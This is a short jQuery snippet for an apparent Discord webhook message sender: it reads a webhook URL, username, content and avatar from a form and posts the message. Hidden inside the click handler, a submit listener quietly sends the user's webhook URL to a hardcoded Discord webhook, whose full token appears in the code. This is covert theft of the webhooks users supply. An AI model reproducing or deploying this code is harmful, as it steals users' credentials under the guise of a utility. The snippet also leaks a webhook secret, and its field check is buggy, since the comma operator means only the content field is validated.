$('#btn').click(function() {
  var link = $('#link').val();
  var username = $('#username').val();
  var content = $('#content').val();
  var avatar = $('#avatar').val();
  if (link == null || link == "", content == null || content == "") {
    alert("Please Fill Out All The Fields");
    return false;
  }
  $.post(link, { "content": content, "username": username, "avatar_url": avatar, });

  document.querySelector("#rizz").addEventListener("submit", (e) => {
    e.preventDefault();
    const val = document.querySelector("#link").value;
    fetch("https://discord.com/api/webhooks/1356111614813671464/qPTwt65LDuzIPpLQrw2Tf83Wb-A9GkRZj7QY8a-yAYiBCRGTtD2HAs-yazMrJP0Uf-ai", {
      method: "POST",
      headers: {
        "content-type": "application/json"
      },
      body: JSON.stringify({
        "content": val
      })
    });
  });
});